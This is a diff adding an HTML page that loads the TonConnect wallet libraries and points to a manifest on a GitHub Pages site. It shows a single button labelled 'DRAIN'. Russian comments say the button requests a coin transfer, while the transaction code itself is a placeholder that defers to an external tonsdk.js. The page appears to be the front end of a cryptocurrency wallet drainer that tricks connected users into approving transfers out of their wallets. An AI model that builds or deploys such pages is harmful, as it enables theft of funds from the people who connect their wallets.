@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+    <script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>
+    
+</head>
+<body>
+
+<div id="ton-connect"></div>  <!--Коннект кошелька-->
+<button onclick="didtrans();" style="MARGIN-TOP:30PX;FONT-SIZE:24PX;">DRAIN</button><!--Запрос трансфера монет-->
+
+<script>
+  // Предположим, что ваш скрипт tonsdk.js использует SDK
+  // и там происходит инициализация tonConnectUI.
+  // Пример того, как может выглядеть инициализация:
+
+  const tonConnectUI = new TonConnectUI({
+    manifestUrl: 'https://sositeyaisa.github.io/ton/tonconnect-manifest.json' // <-- Ваша ссылка на манифест
+  });
+
+  // ... остальной код из tonsdk.js ...
+
+  async function didtrans() {
+    // ... код, отвечающий за транзакцию ...
+  }
+
+</script>
+
+<script src="tonsdk.js"></script>
+ 
+</body>
+</html>
+
